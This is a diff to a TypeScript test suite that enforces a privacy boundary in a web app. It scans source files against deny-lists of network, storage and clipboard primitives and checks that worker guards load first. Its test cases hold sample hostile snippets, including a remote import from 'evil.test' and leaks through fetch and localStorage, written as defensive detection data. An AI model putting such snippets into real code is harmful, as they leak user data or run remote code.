@@ -3,6 +3,7 @@ import path from "node:path";
 
 import { describe, expect, it } from "vitest";
 
+import { scanPrivacySourceFile } from "../../scripts/privacy-manifest-core.mjs";
 import {
   forbiddenOperationWorkerGlobals,
   installOperationWorkerPrivacyGuards,
@@ -15,6 +16,11 @@ const forbiddenPrimitives = [
   ["XMLHttpRequest", /\bXMLHttpRequest\b/u],
   ["WebSocket", /\bWebSocket\b/u],
   ["EventSource", /\bEventSource\b/u],
+  ["WebTransport", /\bWebTransport\b/u],
+  ["RTCPeerConnection", /\bRTCPeerConnection\b/u],
+  ["SharedWorker", /\bSharedWorker\b/u],
+  ["BroadcastChannel", /\bBroadcastChannel\b/u],
+  ["importScripts", /\bimportScripts\s*\(/u],
   ["sendBeacon", /\bsendBeacon\s*\(/u],
   ["localStorage", /\blocalStorage\b/u],
   ["sessionStorage", /\bsessionStorage\b/u],
@@ -50,6 +56,7 @@ async function localRuntimeSourceFiles(): Promise<string[]> {
   await visit(path.resolve("src/tools"));
   await visit(path.resolve("src/workflows"));
   files.push(path.resolve("src/workers/operation.worker.ts"));
+  files.push(path.resolve("src/workers/image-compressor.worker.ts"));
   files.push(
     path.resolve("src/lib/operation-runtime-probe.ts"),
     path.resolve("src/lib/workflow-runtime-probe.ts"),
@@ -63,6 +70,18 @@ async function localRuntimeSourceFiles(): Promise<string[]> {
 
 async function workflowUiSourceFiles(): Promise<string[]> {
   const directory = path.resolve("src/components/workflows");
+  return (await readdir(directory, { withFileTypes: true }))
+    .filter(
+      (entry) =>
+        entry.isFile() &&
+        (entry.name.endsWith(".ts") || entry.name.endsWith(".tsx")),
+    )
+    .map((entry) => path.join(directory, entry.name))
+    .sort();
+}
+
+async function toolUiSourceFiles(): Promise<string[]> {
+  const directory = path.resolve("src/components/tools");
   return (await readdir(directory, { withFileTypes: true }))
     .filter(
       (entry) =>
@@ -111,6 +130,71 @@ describe("operation privacy boundary", () => {
         code: "unsupported-environment",
       }),
     );
+
+    const absentTarget = Object.defineProperty({}, "fetch", {
+      configurable: false,
+      writable: false,
+      value: undefined,
+    });
+    expect(() =>
+      installOperationWorkerPrivacyGuards(absentTarget),
+    ).not.toThrow();
+
+    const writableUndefinedTarget = Object.defineProperty({}, "fetch", {
+      configurable: false,
+      writable: true,
+      value: undefined,
+    });
+    expect(() =>
+      installOperationWorkerPrivacyGuards(writableUndefinedTarget),
+    ).toThrow(
+      expect.objectContaining({
+        name: "OperationError",
+        code: "unsupported-environment",
+      }),
+    );
+  });
+
+  it("scans every production source file with a closed capability allowlist", async () => {
+    const sourceRoot = path.resolve("src");
+    const files: string[] = [];
+    const visit = async (directory: string): Promise<void> => {
+      for (const entry of await readdir(directory, { withFileTypes: true })) {
+        const entryPath = path.join(directory, entry.name);
+        if (entry.isDirectory()) await visit(entryPath);
+        else if (
+          entry.isFile() &&
+          /\.(?:astro|[cm]?[jt]sx?)$/u.test(entry.name) &&
+          !entry.name.endsWith(".d.ts")
+        ) {
+          files.push(entryPath);
+        }
+      }
+    };
+    await visit(sourceRoot);
+
+    const issues: string[] = [];
+    for (const file of files) {
+      issues.push(
+        ...scanPrivacySourceFile(
+          path.relative(process.cwd(), file),
+          await readFile(file, "utf8"),
+        ),
+      );
+    }
+    expect(issues).toEqual([]);
+  });
+
+  it.each([
+    ["network", "fetch('/leak')"],
+    ["persistence", "localStorage.setItem('payload', secret)"],
+    ["clipboard read", "navigator.clipboard.readText()"],
+    ["remote code", "import('https://evil.test/runtime.js')"],
+    ["template interpolation", "const value = `safe ${fetch('/leak')}`"],
+  ])("rejects injected %s capability use", (_name, source) => {
+    expect(
+      scanPrivacySourceFile("src/components/Injected.tsx", source),
+    ).not.toEqual([]);
   });
 
   it("keeps the serializable catalog isolated from adapter and tool code", async () => {
@@ -166,6 +250,54 @@ describe("operation privacy boundary", () => {
     }
 
     expect(violations).toEqual([]);
+  });
+
+  it("keeps tool UI free of network, persistence and automatic clipboard reads", async () => {
+    const violations: string[] = [];
+    const uiForbiddenPrimitives = [
+      ...forbiddenPrimitives.filter(([name]) => name !== "clipboard"),
+      ["clipboard read", /\bclipboard\s*\.\s*(?:read|readText)\s*\(/u] as const,
+      ["console payload logging", /\bconsole\s*\./u] as const,
+    ];
+
+    for (const file of await toolUiSourceFiles()) {
+      const source = await readFile(file, "utf8");
+      const relativePath = path.relative(process.cwd(), file);
+      for (const [name, pattern] of uiForbiddenPrimitives) {
+        if (pattern.test(source)) violations.push(`${relativePath}: ${name}`);
+      }
+    }
+
+    expect(violations).toEqual([]);
+  });
+
+  it("installs Worker privacy guards before loading both runtime implementations", async () => {
+    const operationWorker = await readFile(
+      path.resolve("src/workers/operation.worker.ts"),
+      "utf8",
+    );
+    const imageWorker = await readFile(
+      path.resolve("src/workers/image-compressor.worker.ts"),
+      "utf8",
+    );
+
+    for (const source of [operationWorker, imageWorker]) {
+      const guard = source.indexOf(
+        "installOperationWorkerPrivacyGuards(globalThis)",
+      );
+      expect(guard).toBeGreaterThanOrEqual(0);
+      expect(source).not.toMatch(/import\s+\{\s*encodeRgbaToPng\s*\}\s+from/u);
+    }
+    expect(imageWorker.indexOf("await import(")).toBeGreaterThan(
+      imageWorker.indexOf("installOperationWorkerPrivacyGuards(globalThis)"),
+    );
+    expect(
+      operationWorker.indexOf("loadOperationDefinition(manifest.id)"),
+    ).toBeGreaterThan(
+      operationWorker.indexOf(
+        "installOperationWorkerPrivacyGuards(globalThis)",
+      ),
+    );
   });
 
   it("exports template recipes without payload, result or runtime fields", () => {
